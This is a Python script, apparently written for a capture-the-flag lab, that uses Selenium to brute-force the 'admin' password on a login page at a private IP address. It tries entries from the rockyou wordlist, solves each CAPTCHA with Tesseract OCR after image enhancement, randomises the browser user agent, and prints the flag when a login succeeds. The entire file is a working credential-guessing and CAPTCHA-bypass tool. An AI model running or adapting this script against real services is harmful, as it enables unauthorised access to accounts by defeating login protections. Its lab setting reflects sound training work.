from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from fake_useragent import UserAgent

from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os
import time

# === CONFIG ===
TARGET_IP = 'http://10.10.82.117'
LOGIN_URL = f'{TARGET_IP}/index.php'
DASHBOARD_URL = f'{TARGET_IP}/dashboard.php'
USERNAME = 'admin'
ROCKYOU_PATH = '/usr/share/wordlists/rockyou.txt'

# === HIGH-SCALE OCR FUNCTION ===
def read_captcha(img_bytes, password=None):
    image = Image.open(io.BytesIO(img_bytes)).convert("L")

    # Resize: scale up 10x
    image = image.resize((image.width * 10, image.height * 10), Image.LANCZOS)

    # Enhance
    image = image.filter(ImageFilter.SHARPEN)
    image = ImageEnhance.Contrast(image).enhance(2.5)
    image = image.point(lambda x: 0 if x < 140 else 255, '1')

    # Save processed image (optional)
    if password:
        image.save(f"captchas/processed_{password}.png")

    return pytesseract.image_to_string(
        image,
        config="--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789"
    ).strip().replace(" ", "").replace("\n", "").upper()

# === SETUP ===
os.makedirs("captchas", exist_ok=True)

options = Options()
# options.add_argument("--headless")  # Uncomment for headless mode
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--no-sandbox")
options.add_argument("--disable-cache")
options.add_argument("--disable-gpu")
options.add_argument("start-maximized")
options.add_argument(f"user-agent={UserAgent().random}")
options.binary_location = "/usr/bin/chromium"

service = Service("/usr/bin/chromedriver")
browser = webdriver.Chrome(service=service, options=options)

# === LOAD PASSWORDS ===
with open(ROCKYOU_PATH, "r", encoding="latin1") as f:
    passwords = [line.strip() for _, line in zip(range(100), f)]

# === MAIN LOOP ===
for password in passwords:
    while True:
        browser.get(LOGIN_URL)
        time.sleep(1.5)

        try:
            csrf_token = browser.find_element(By.NAME, "csrf_token").get_attribute("value")
            captcha_img_element = browser.find_element(By.CSS_SELECTOR, "img[src='captcha.php']")
            captcha_png = captcha_img_element.screenshot_as_png

            # Save original
            Image.open(io.BytesIO(captcha_png)).save(f"captchas/original_{password}.png")

            # Use enhanced OCR
            captcha_text = read_captcha(captcha_png, password)

            # Validate CAPTCHA
            if not captcha_text.isalnum() or len(captcha_text) != 5:
                print(f"[!] OCR failed: '{captcha_text}' — retrying...")
                continue

            print(f"[*] Trying: '{password}' | CAPTCHA: '{captcha_text}'")

            # Fill form
            browser.find_element(By.ID, "username").send_keys(USERNAME)
            browser.find_element(By.ID, "password").send_keys(password)
            browser.find_element(By.ID, "captcha_input").send_keys(captcha_text)
            browser.find_element(By.ID, "login-btn").click()

            time.sleep(2)

            if DASHBOARD_URL in browser.current_url:
                print(f"[+] SUCCESS! Password: '{password}' | CAPTCHA: '{captcha_text}'")
                try:
                    flag = browser.find_element(By.TAG_NAME, "p").text
                    print(f"[+] FLAG: {flag}")
                except:
                    print("[!] Logged in, but flag not found.")
                browser.quit()
                exit()
            else:
                print("[-] Login failed.")
                break

        except Exception as e:
            print(f"[ERROR] {e}")
            break

browser.quit()
